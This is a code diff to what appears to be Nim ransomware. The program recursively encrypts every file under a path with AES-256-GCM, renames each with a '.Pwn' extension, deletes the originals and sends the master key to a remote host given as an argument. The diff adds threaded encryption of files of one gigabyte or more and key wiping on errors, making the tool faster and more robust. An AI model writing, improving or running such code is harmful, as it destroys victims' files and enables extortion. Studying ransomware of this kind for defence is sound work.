@@ -5,28 +5,35 @@ key = aes(master, sha(filename & filesize))
 different key per file using their initial filename and filesize
 ]#
 
-import std/[os, net, strformat, strutils, sha1, sysrand]
+import std/[os, net, strformat, strutils, sha1, sysrand, threadpool]
 import nimcrypto
 
 const
   AES_256_KEY_SIZE = 32
   AES_BLOCK_SIZE = 16
+  FILE_SIZE = 1 * 1024 * 1024 * 1024
   EXT = "Pwn"
 
-proc decrypt(ctx: var GCM[aes256], fn: string) =
+type fcn = proc(key: seq[byte], x: string) {.gcsafe, thread.}
+
+proc decrypt(key: seq[byte], fn: string) =
   var
     output = changeFileExt(fn, "")
     ct = cast[seq[byte]](readFile(fn))
     pt = newSeq[byte](len(ct))
+    ctx: GCM[aes256]
+  ctx.init(key, [], [])
   ctx.decrypt(ct, pt)
   writeFile(output, pt)
   removeFile(fn)
 
-proc encrypt(ctx: var GCM[aes256], fn: string) =
+proc encrypt(key: seq[byte], fn: string) =
   var
     output = fmt"{fn}.{EXT}"
     pt = cast[seq[byte]](readFile(fn))
     ct = newSeq[byte](len(pt))
+    ctx: GCM[aes256]
+  ctx.init(key, [], [])
   ctx.encrypt(pt, ct)
   writeFile(output, ct)
   removeFile(fn)
@@ -43,18 +50,20 @@ proc genKey(master: seq[byte], filename: string, filesize: BiggestInt): seq[byte
   ctx.encrypt(nonce, key)
   return key
 
-proc walk(path: string, master: seq[byte], act: proc(c: var GCM[aes256], x: string)) =
-  var ctx: GCM[aes256]
+proc walk(path: string, master: seq[byte], act: fcn) =
   if(fileExists(path)):
     let key = genKey(master, path, getFileSize(path))
-    ctx.init(key, [], [])
-    act(ctx, path)
+    act(key, path)
     return
   for entry in walkDirRec(path):
     if entry.fileExists:
-      let key = genKey(master, entry, getFileSize(entry))
-      ctx.init(key, [], [])
-      act(ctx, entry)
+      let
+        fs  = getFileSize(entry)
+        key = genKey(master, entry, fs)
+      if fs >= FILE_SIZE:
+        spawn act(key, entry)
+      else:
+        act(key, entry)
 
 proc sendKeyIv(host: (string, Port), key: seq[byte]) =
   var server = newSocket()
@@ -79,12 +88,16 @@ proc main() =
         port = Port parseUInt paramStr(4)
         master = urandom(AES_256_KEY_SIZE)
       sendKeyIv((ip, port), master)
-      walk(path, master, encrypt)
+      try: walk(path, master, encrypt)
+      except: zeroMem(unsafeAddr master[0], AES_256_KEY_SIZE)
+      sync()
     of 'd':
       let
         path = paramStr(2)
         master = cast[seq[byte]](parseHexStr paramStr(3))
-      walk(path, master, decrypt)
+      try: walk(path, master, decrypt)
+      except: zeroMem(unsafeAddr master[0], AES_256_KEY_SIZE)
+      sync()
     else:
       stderr.write "neither e(ncrypt) or d(ecrypt): aborting\n"
       quit 1
